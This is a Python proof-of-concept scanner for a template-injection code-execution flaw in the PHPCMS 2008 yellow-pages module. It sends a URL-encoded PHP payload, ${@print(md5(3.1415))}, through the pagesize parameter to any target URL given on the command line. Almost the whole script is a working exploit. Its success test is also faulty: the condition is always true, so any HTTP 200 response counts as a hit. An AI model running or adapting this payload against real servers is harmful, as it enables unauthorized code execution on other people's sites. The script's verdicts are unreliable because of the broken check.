# coding=utf-8
'''
phpcms 2008的代码中由于对模板参数处理不当，导致可以任意执行任意代码文件。
'''

import sys
import requests
def scan(target):
    info = {
    'name':u'PHPCMS 2008黄页模块代码执行漏洞',
    'date':'2014-11-30',
    'author':'5up3rc',
    'poc': '/yp/product.php?pagesize=%24%7B%40%70%72%69%6E%74%28%6D%64%35%28%33%2E%31%34%31%35%29%29%7D'
    }
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:30.0) Gecko/20100101 Firefox/30.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    }
    audit_request = requests.get(target + info['poc'],headers=headers)
    audit_request.close()
    if audit_request.status_code == 200:
        if audit_request.text.find('63e1f04640e83605c1d177544a5a0488') !=0  or audit_request.text.find('63e1f04640e83605c1d177544a5a0488') !=-1:
            print u'[!]audit success'
            print '[*]' + target + info['poc']
        else:
            print u'[!]audit error'
    else:
        print 'connection error'
if __name__ == '__main__':
    if len(sys.argv) < 2:
        print "Usage: python phpcms_yp_code_exec.py [target]\n"
        print "Example: python phpcms_yp_code_exec.py  http://www.xxx.com\n"
        sys.exit(1)
    else:
        target = sys.argv[1].lower()
    scan(target)
